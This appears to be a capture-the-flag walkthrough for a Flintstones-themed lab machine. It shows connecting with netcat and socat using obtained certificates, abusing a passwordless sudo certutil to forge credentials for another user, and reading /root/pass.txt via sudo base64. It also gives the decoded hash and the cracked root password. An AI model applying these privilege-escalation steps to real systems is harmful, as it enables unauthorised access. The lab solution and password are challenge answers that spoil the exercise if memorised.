# Initial access

first, setup netcat with: nc <ip_addr> <target_port(eg: 9009)>
or
use telnet as: 
```bash
telnet <ip_addr> <target_port(eg: 9009)>
```

now, type; "cert, key, and help" for more info (also, save the cert obtained to a file)


Once done, try connecting using:
```
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
```
<!-- 
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0 <<<< this was used
or
curl -vk https://<ip_addr>:54321 --cert cert.crt --key key.key --insecure <<<< just for tryout | -k to skip certificate validation
or
openssl s_client -connect <ip_addr>:54321 -cert ./cert.crt -key ./key.key <<<< just for tryout
          u can use;
          - openssl rsa -in key.key -check ||| to verify validity of this private key |] output: "rsa key ok"
          - openssl x509 -in key.key -noout -text
-->
          
After using socat, type; "hints, password(s)" to get the username + passwd.

Now login through the ssh port with the name barney and the passwd.


# Going horizontal

Once logged in, use "sudo -l" to see avaliable prives

```
/usr/bin/certutil <--- was found to run with now paswd
```
 
now, use 
```
sudo /usr/bin/certutil [username] [full_name]
            username=fred
            fullname="Fred Flintstone"
```
set these inorder to have a cert and a key for fred.

Use socat with freds key and cert to get a hint about his password


# Gaining root

With all those obtained, get the user flag, and use "sudo -l" within fred's session and see what you can execute
```
sudo base64 /root/pass.txt
```

get the value of pass.txt, decode it, and keep doing "base64 -d" and later on "base32 -d" till you get
```
a00a12aad6b7c16bf07032bd05a31d56
```
now, use the online tool `https://crackstation.net/` (or any password bruteforce tool) to crack this password which is
```
flintstonesvitamins
```
with that, ssh once more as the admin to complete the job
